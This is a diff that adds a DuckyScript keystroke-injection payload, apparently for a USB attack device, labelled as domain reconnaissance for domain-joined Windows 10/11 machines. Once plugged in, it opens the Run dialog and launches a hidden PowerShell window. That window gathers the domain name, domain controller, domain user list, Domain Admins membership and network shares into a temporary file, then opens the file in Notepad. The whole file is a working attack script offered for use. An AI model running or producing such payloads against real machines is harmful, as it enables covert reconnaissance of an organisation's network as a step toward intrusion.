@@ -1,0 +1,12 @@
+REM Author: UNC0V3R3D
+REM Description: Collects domain information — domain name, DC, domain users, shares, and GPO info.
+REM Version: 1.0
+REM Category: Recon
+REM Target: Windows 10/11 (domain-joined)
+DELAY 1000
+GUI r
+DELAY 700
+STRING powershell -windowstyle hidden -Command "$out='=== Domain Recon ==='+[char]10;$out+='Domain: '+(Get-WmiObject Win32_ComputerSystem).Domain+[char]10;$out+='DC: '+(nltest /dsgetdc: 2>$null)+[char]10;$out+='Domain Users: '+(net user /domain 2>$null)+[char]10;$out+='Domain Admins: '+(net group 'Domain Admins' /domain 2>$null)+[char]10;$out+='Shares: '+(net view /domain 2>$null)+[char]10;$out | Out-File $env:TEMP\domain_info.txt -Force;Start-Process notepad $env:TEMP\domain_info.txt"
+ENTER
+DELAY 4000
+REM End of payload
